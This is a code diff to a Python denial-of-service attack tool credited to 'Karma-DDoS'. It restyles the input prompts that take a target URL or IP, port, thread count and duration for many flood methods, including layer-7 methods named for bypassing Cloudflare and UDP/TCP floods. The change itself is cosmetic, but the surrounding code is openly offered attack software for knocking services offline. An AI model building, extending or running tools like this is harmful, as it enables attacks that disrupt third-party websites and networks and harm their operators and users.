@@ -1,3 +1,5 @@
+#Credit : Karma-DDoS 
+
 ############################################################################################################################################################################################################################################################################################################################################################################
 
 global user_agents
@@ -28,11 +30,22 @@ def countdown(t):
         t -= 1
         if t > 0:
             stdout.flush()
-            print("Time Left : {}             ".format(t), end='\r')
+            print(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Time Left : {}".format(t), end='\r')
         else:
             stdout.flush()
-            print("Attack Completed!")
+            print(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Attack Completed! ")
             return
+def layer7_target():
+    url = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL             "+'\033[1;35m'+': '+'\033[0m')
+    threadsi = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"THRD            "+'\033[1;35m'+': '+'\033[0m')
+    t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
+    return url, threadsi, t
+def layer4_target():
+    ip = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"IP              "+'\033[1;35m'+': '+'\033[0m')
+    port = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PORT            "+'\033[1;35m'+': '+'\033[0m')
+    threadsi = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"THRD            "+'\033[1;35m'+': '+'\033[0m')
+    t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
+    return ip, port, threadsi, t
 def clear():
     if os.name == 'posix':
         os.system('clear')
@@ -141,9 +154,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input('Target Url : ')
-            threadsi = input('Threads : ')
-            t = input('Time : ')
+            url, threadsi, t = layer7_target()
             SCFB(url, threadsi, t)
     def PXCFB():
         def SPXCFB(url, threadsi, t):
@@ -167,9 +178,7 @@ class DDOS():
                 except Exception as e:
                     pass
         if __name__ == '__main__':
-            url = input('Target Url : ')
-            threadsi = input('Threads : ')
-            t = input('Time : ')
+            url, threadsi, t = layer7_target()
             SPXCFB(url, threadsi, t)
     def SKY():
         ip_list = open('ip_list.txt', 'r')
@@ -208,9 +217,7 @@ class DDOS():
                 except:
                     s.close()
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             ASKY(url, threadsi, t)
     def PPS():
         ua = UserAgent()
@@ -236,9 +243,7 @@ class DDOS():
                 except:
                     s.close()
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             SPPS(url, threadsi, t)
     def ION():
         spr = cloudscraper.create_scraper()
@@ -256,9 +261,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             SION(url, threadsi, t)
     def CFPRO():
         def SCFP(url, threadsi, t):
@@ -294,9 +297,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             SCFP(url, threadsi, t)
     def BYPASS1():
         def SBS(url, threadsi, t):
@@ -326,9 +327,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             SBS(url, threadsi, t)
     def PXCFPRO():
         def SPXCFP(url, threadsi, t):
@@ -368,9 +367,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             SPXCFP(url, threadsi, t)
     def CFSOC():
         def SCFS(url, threadsi, t, port):
@@ -394,10 +391,8 @@ class DDOS():
                     pack.close()
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
-            port = input("Port : ")
+            url, threadsi, t = layer7_target()
+            port = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PORT            "+'\033[1;35m'+': '+'\033[0m')
             SCFS(url, threadsi, t, port)
     def BYPASS2():
         ip_list = open('ip_list.txt', 'r')
@@ -438,9 +433,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             SBS(url, threadsi, t)
     def STRESSERV1():
             ua = UserAgent()
@@ -487,9 +480,7 @@ class DDOS():
                     except:
                         pass
             if __name__ == '__main__':
-                url = input("Target Url : ")
-                threadsi = input("Threads : ")
-                t = input("Time : ")
+                url, threadsi, t = layer7_target()
                 SS(url, threadsi, t)
     def STRESSERV2():
             ua = UserAgent()
@@ -546,9 +537,7 @@ class DDOS():
                     print("An error occurred: ", e, ', Please contact : @MrSanZzXe on telegram!')
                     pass
             if __name__ == '__main__':
-                url = input("Target Url : ")
-                threadsi = input("Threads : ")
-                t = input("Time : ")
+                url, threadsi, t = layer7_target()
                 SS(url, threadsi, t)
     def PWNED():
         def start_pwn(url, threadsi, t):
@@ -579,9 +568,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             start_pwn(url, threadsi, t)
     def PXSKY():
         def start_pxsky(url, threadsi, t):
@@ -608,9 +595,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            url, threadsi, t = layer7_target()
             start_pxsky(url, threadsi, t)
     def PXSTAR():
         ua = UserAgent()
@@ -642,8 +627,8 @@ class DDOS():
                 ts = threading.Thread(target=star, args=(url, header, proxy))
                 ts.start()
         if __name__ == '__main__':
-            url = input("Target Url : ")
-            t = input("Time : ")
+            url = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL             "+'\033[1;35m'+': '+'\033[0m')
+            t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
             attack(t, url)
     ################LAYER 4################
     ###UDP TCP TLS SYN ACK ICMP ESP SSH ###
@@ -672,10 +657,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            ip = input("IP Target : ")
-            port = int(input("Port : "))
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            ip, port, threadsi, t = layer4_target()
             SUDP(ip, port, threadsi, t)
     def TCP():
         def STCP(ip, port, threadsi, t):
@@ -703,10 +685,7 @@ class DDOS():
                 except:
                     pass
         if __name__ == '__main__':
-            ip = input("IP Target : ")
-            port = int(input("Port : "))
-            threadsi = input("Threads : ")
-            t = input("Time : ")
+            ip, port, threadsi, t = layer4_target()
             STCP(ip, port, threadsi, t)
 class TOOLS():
     def proxy():
